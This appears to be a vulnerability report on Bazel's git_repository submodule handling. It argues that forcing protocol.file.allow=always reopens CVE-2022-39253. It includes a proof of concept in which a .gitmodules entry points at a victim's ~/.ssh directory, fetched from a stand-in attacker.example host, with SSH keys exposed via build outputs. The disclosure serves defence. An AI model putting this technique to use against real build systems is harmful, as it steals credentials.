### Title
Bazel's `git_repository`/`new_git_repository` submodule handling forces `protocol.file.allow=always`, reinstating the CVE-2022-39253 local-file submodule disclosure - (File: `tools/build_defs/repo/git_worker.bzl`)

### Summary

### Finding Description
`git_repository`/`new_git_repository` accept `init_submodules`/`recursive_init_submodules` attributes that cause Bazel to run `git submodule update` on the cloned tree [1](#0-0) . The actual command is built in `update_submodules()`:

```
_git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", ["--recursive"], "--checkout", "--force")
``` [2](#0-1) 

Git 2.38.1 changed the default of `protocol.file.allow` from `always` to `user` specifically for URLs that originate from a repository's own tracked, attacker-controlled `.gitmodules` file (as opposed to URLs the local operator types directly). This was the fix for CVE-2022-39253: without it, a malicious repository can declare a submodule with a `file://` (or bare local path) URL pointing at an arbitrary path on the machine performing the clone (e.g. `/etc/passwd`, a source-control checkout, credential files, `.ssh` keys, etc.). Because local `file://` clones use hardlinks/reflinks by default, the contents of that arbitrary local path get materialized as tracked files inside the checked-out submodule tree.

Bazel's `update_submodules()` explicitly re-enables `protocol.file.allow=always` on the command line via `-c`, unconditionally overriding whatever the installed Git's secure default is, purely to keep local-path submodule fetches (bazelbuild/bazel#17040) working. This means every `git_repository`/`new_git_repository` invocation with `init_submodules = True` or `recursive_init_submodules = True` runs with the pre-CVE-2022-39253, insecure submodule policy, regardless of the Git version's own protections.

The `.gitmodules` file and the submodule's `url` field are ordinary tracked content supplied by whoever controls the `remote` repository — i.e., an unprivileged party who can publish a git ref (a public/forked repo, a compromised or spoofable mirror, a shared/internal repo an unwitting engineer points a `git_repository` rule at, or a hostile branch that CI is configured to build). No access to the victim's machine, credentials, or trusted root `MODULE.bazel`/`WORKSPACE` content is required beyond the ability to have `remote` point at attacker content and to set `init_submodules`/`recursive_init_submodules` to true (a config a project owner may set once for a benign dependency whose upstream is later compromised, or which an attacker fully controls if they can influence the `remote` URL, e.g. through a supply-chain-style dependency).

### Impact Explanation
Successful exploitation lets remote-published git content — served entirely by the attacker, not by the victim's trusted configuration — cause the local build machine to copy the contents of arbitrary local files (readable by the Bazel/user process, e.g. `~/.ssh/*`, cloud credential files, `.netrc`, other checked-out source trees) into the fetched external repository's working tree at a path of the attacker's choosing. Those contents then become ordinary tracked files inside `@repo//...`, which can be wired into a `filegroup`/`genrule` (as demonstrated by Bazel's own submodule test harness, which builds targets directly from files pulled in via submodules) and thereby exfiltrated into build outputs, logs, or artifacts the attacker (or anyone with visibility into CI outputs) can read. This is a read-outside-the-intended-source containment break driven purely by attacker-supplied repository content, matching the "credential/file exfiltration via containment bypass" class.

### Likelihood Explanation
Any consumer using `git_repository`/`new_git_repository` with `init_submodules = True` or `recursive_init_submodules = True` against a remote the attacker can influence (a fork, compromised mirror, or a repo the attacker directly controls and gets referenced) is affected on every fetch/re-fetch, with default flags, on any currently supported Git version — Bazel is actively bypassing the upstream Git hardening rather than relying on it. The only prerequisite is that the project's `git_repository` definition enables submodule initialization, which is a normal, common configuration (also exercised by Bazel's own `test_git_repository_submodules_with_recursive_init_modules` test) [3](#0-2) , not an unusual or hardened opt-in.

### Recommendation
Do not force `protocol.file.allow=always` unconditionally in `update_submodules()`. Instead, scope the override narrowly (e.g. only allow `file://` for submodule URLs that resolve to paths already known to be inside the same clone/trusted remote tree), or require an explicit, documented opt-in attribute on `git_repository`/`new_git_repository` before re-enabling this legacy behavior, so that untrusted remotes cannot leverage `.gitmodules` to pull arbitrary local files into the checkout by default.

### Proof of Concept
1. Attacker publishes/controls a git repository `evil.git` containing a `.gitmodules` entry:
   ```
   [submodule "leak"]
       path = leak
       url = file:///home/victim/.ssh
   ```
   with a corresponding gitlink commit for the `leak` path.
2. Victim (or CI) has a workspace rule:
   ```python
   git_repository(
       name = "evil",
       remote = "https://attacker.example/evil.git",
       branch = "main",
       recursive_init_submodules = True,
   )
   ```
3. On `bazel build`, `_git_repository_implementation` → `_clone_or_update_repo` → `git_repo()` → `_update()` → `update_submodules()` runs `git -c protocol.file.allow=always submodule update --init --recursive --checkout --force` [2](#0-1) , which (on Git ≥2.38.1, where this would otherwise be blocked) successfully clones `/home/victim/.ssh` into `external/+git_repository+evil/leak/`, exposing its contents as ordinary tracked files.
4. A `filegroup`/`genrule` referencing `@evil//:leak/id_rsa` (analogous to the existing `outer_planets` submodule test pattern) makes the exfiltrated file content part of a build output that the attacker can retrieve via CI artifacts/logs. [2](#0-1) [1](#0-0)

def update_submodules(ctx, git_repo, recursive = False):
    if recursive:
        # "protocol.file.allow=always" allows the submodule command clone from a local directory.
        # It's necessary for Git 2.38.1 and assoicated backport versions.
        # See https://github.com/bazelbuild/bazel/issues/17040
        _git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--recursive", "--checkout", "--force")
    else:
        _git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--checkout", "--force")
```
